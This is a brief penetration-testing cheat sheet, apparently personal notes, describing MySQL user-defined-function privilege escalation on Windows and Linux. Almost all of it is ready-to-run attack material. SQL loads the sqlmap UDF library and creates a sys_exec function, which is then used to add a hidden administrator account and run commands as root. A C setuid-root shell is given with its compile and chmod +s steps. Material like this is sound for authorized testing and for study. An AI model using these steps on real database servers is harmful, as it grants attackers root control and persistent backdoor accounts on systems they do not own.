# References
> - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/

Take lib from SQLMap and dump it into the server:
```
udf/mysql/linux/32/lib_mysqludf_sys.so
udf/mysql/linux/64/lib_mysqludf_sys.so
udf/mysql/windows/32/lib_mysqludf_sys.dll
udf/mysql/windows/64/lib_mysqludf_sys.dll
```

On Windows:
```
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

On Linux:
```
use mysql;
create table npn(line blob);
insert into npn values(load_file('/home/npn/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');

npn@pwn:~$ cat /tmp/out
  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)

// Create a shell, compile it, "chmod +s /tmp/shell" and get reverse shell
```

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0); setgid(0); system(“/bin/bash”);
}

```
```
gcc -o /tmp/shell /home/npn/shell.c
chmod +s /tmp/shell
```
